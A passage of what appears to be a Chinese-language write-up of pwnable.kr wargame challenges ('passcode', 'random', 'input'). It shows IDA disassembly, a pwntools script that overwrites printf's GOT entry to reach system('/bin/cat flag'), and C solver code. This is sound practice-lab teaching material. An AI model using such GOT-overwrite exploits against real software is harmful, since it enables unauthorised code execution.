+.text:0804865E                 call    ___stack_chk_fail
+.text:08048663 ; ---------------------------------------------------------------------------
+.text:08048663
+.text:08048663 locret_8048663:                         ; CODE XREF: welcome+53↑j
+.text:08048663                 leave
+.text:08048664                 retn
+.text:08048664 ; } // starts at 8048609
+</code></pre><p>在首先调用的welcome函数中，name的地址是ebp+var_70，即ebp-70。</p>
+<pre tabindex="0"><code>.text:08048564 var_10          = dword ptr -10h
+.text:08048564 var_C           = dword ptr -0Ch
+.text:08048564
+.text:08048564 ; __unwind {
+.text:08048564                 push    ebp
+.text:08048565                 mov     ebp, esp
+.text:08048567                 sub     esp, 28h
+.text:0804856A                 mov     eax, offset format ; &#34;enter passcode1 : &#34;
+.text:0804856F                 mov     [esp], eax      ; format
+.text:08048572                 call    _printf
+.text:08048577                 mov     eax, offset aD  ; &#34;%d&#34;
+.text:0804857C                 mov     edx, [ebp+var_10]
+.text:0804857F                 mov     [esp+4], edx
+.text:08048583                 mov     [esp], eax
+.text:08048586                 call    ___isoc99_scanf
+.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
+.text:08048590                 mov     [esp], eax      ; stream
+.text:08048593                 call    _fflush
+.text:08048598                 mov     eax, offset aEnterPasscode2 ; &#34;enter passcode2 : &#34;
+.text:0804859D                 mov     [esp], eax      ; format
+.text:080485A0                 call    _printf
+.text:080485A5                 mov     eax, offset aD  ; &#34;%d&#34;
+.text:080485AA                 mov     edx, [ebp+var_C]
+.text:080485AD                 mov     [esp+4], edx
+.text:080485B1                 mov     [esp], eax
+.text:080485B4                 call    ___isoc99_scanf
+.text:080485B9                 mov     dword ptr [esp], offset s ; &#34;checking...&#34;
+.text:080485C0                 call    _puts
+.text:080485C5                 cmp     [ebp+var_10], 528E6h
+.text:080485CC                 jnz     short loc_80485F1
+.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
+.text:080485D5                 jnz     short loc_80485F1
+.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; &#34;Login OK!&#34;
+.text:080485DE                 call    _puts
+.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;
+.text:080485EA                 call    _system
+.text:080485EF                 leave
+.text:080485F0                 retn
+.text:080485F1 ; ---------------------------------------------------------------------------
+.text:080485F1
+.text:080485F1 loc_80485F1:                            ; CODE XREF: login+68↑j
+.text:080485F1                                         ; login+71↑j
+.text:080485F1                 mov     dword ptr [esp], offset aLoginFailed ; &#34;Login Failed!&#34;
+.text:080485F8                 call    _puts
+.text:080485FD                 mov     dword ptr [esp], 0 ; status
+.text:08048604                 call    _exit
+.text:08048604 ; } // starts at 8048564
+</code></pre><p>在login函数中，passcode1所对比的值的地址是ebp+var_10，passcode2所对比的值是ebp+var_c的值。</p>
+<p>大致栈结构如下</p>
+<p><img src="https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230327032144013.png" alt="image-20230327032144013"></p>
+<p>所以我们只需要精心构造name中的值，即可修改passcode1的值，passcode1相对输入点（name）的偏移为0x60，虽然我们无法修改passcode2的值，但是此时got表是可写的，可以利用scanf把程序即将调用的函数的got表覆写成我们想要的地址，这样就能跳到我们想要的函数了，也就是在运行第一个scanf之后，我们可以通过修改fflush、printf等函数的got表来跳转到login函数中的system函数</p>
+<pre tabindex="0"><code>.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;
+.text:080485EA                 call    _system
+</code></pre><p>另外要把system的地址转换为十进制，因为输入的scanf使用了%d参数，所以payload为</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> make_packer(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> ssh(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;passcode&#39;</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">2222</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>process(executable<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./passcode&#39;</span>)
+</span></span><span style="display:flex;"><span>printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a000</span>
+</span></span><span style="display:flex;"><span>system_in_login_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;134514147&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">+</span> p(printf_got) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> system_in_login_addr
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="06-random">06. random</h2>
+<blockquote>
+<p>Daddy, teach me how to use random value in programming!</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> random;
+</span></span><span style="display:flex;"><span>        random <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();        <span style="color:#75715e">// random value!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>key);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( (key <span style="color:#f92672">^</span> random) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span> ){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Good!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Wrong, maybe you should try 2^32 cases.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<p>系统在调用rand()之前都会自动调用srand(),如果在srand()里给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机数的初始值；<strong>而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪随机数的初始值</strong>，如果初始值是此时的1或是其他定值，那么每次rand()产生的随机数序列都是一样的，这也就是所谓的“伪随机数”。</p>
+</blockquote>
+<p>如果我们能知道随机数的值，就可以根据deadbeef求出所需key值了。</p>
+<p>完全根据题目中的条件编译一个相似的程序</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> random;
+</span></span><span style="display:flex;"><span>	random <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%u&#34;</span>, random <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xdeadbeef</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>得到3039230856，输入即可。</p>
+<h2 id="07-input">07. input</h2>
+<blockquote>
+<p>Mom? how can I pass my input to a computer program?</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[], <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[]){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome to pwnable.kr</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Let&#39;s see if you know how to give input to program</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Just give me correct inputs then you will get the flag :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// argv
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">100</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#e6db74">&#39;A&#39;</span>],<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#e6db74">&#39;B&#39;</span>],<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x0a\x0d</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stage 1 clear!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// stdio
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">memcmp</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x00\xff</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">2</span>, buf, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">memcmp</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x02\xff</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stage 2 clear!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// env
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xca\xfe\xba\xbe</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>))) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stage 3 clear!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	FILE<span style="color:#f92672">*</span> fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>fp) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">fread</span>(buf, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, fp)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1</span> ) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">memcmp</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>) ) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stage 4 clear!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// network
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> sd, cd;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_in saddr, caddr;
+</span></span><span style="display:flex;"><span>	sd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(sd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;socket error, tell admin</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	saddr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>	saddr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;
+</span></span><span style="display:flex;"><span>	saddr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>( <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#e6db74">&#39;C&#39;</span>]) );
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">bind</span>(sd, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>saddr, <span style="color:#66d9ef">sizeof</span>(saddr)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;bind error, use another port</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">listen</span>(sd, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in);
+</span></span><span style="display:flex;"><span>	cd <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(sd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>caddr, (<span style="color:#66d9ef">socklen_t</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>c);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(cd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;accept error, tell admin</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">recv</span>(cd, buf, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> ) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">memcmp</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>)) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stage 5 clear!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// here&#39;s your flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这道题不太算Pwn题，有点根据服务端写客户端的意思。只需要根据函数中的stage构造需求即可。但是有些条件只能在靶机上完成，所以没有使用pwntools，建议在本地写完之后上传到靶机即可。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stage 1: argv */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>args[<span style="color:#ae81ff">101</span>] <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">101</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>      args[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>; <span style="color:#75715e">// fill up 100 arguments with a filler char
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  args[<span style="color:#e6db74">&#39;A&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>  args[<span style="color:#e6db74">&#39;B&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x0a\x0d</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>  args[<span style="color:#e6db74">&#39;C&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5001&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  args[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stage 3: env */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setenv</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xca\xfe\xba\xbe</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> environ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stage 4: file */</span>
+</span></span><span style="display:flex;"><span>  FILE<span style="color:#f92672">*</span> fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, fp);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stage 2:  stdio */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">pid_t</span> childpid;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pipe_stdin[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pipe_stderr[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// call pipe on both of them
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipe_stdin) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>  <span style="color:#f92672">||</span> <span style="color:#a6e22e">pipe</span>(pipe_stderr) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;oh no</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// fork the process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>((childpid <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>()) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;fork, oop&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// child process can close input side of pipe and write expected values
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(childpid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Child process closes up input side of pipe */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stdin[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stderr[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(pipe_stdin[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x00\xff</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(pipe_stderr[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x02\xff</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Stage 5:  network */</span>
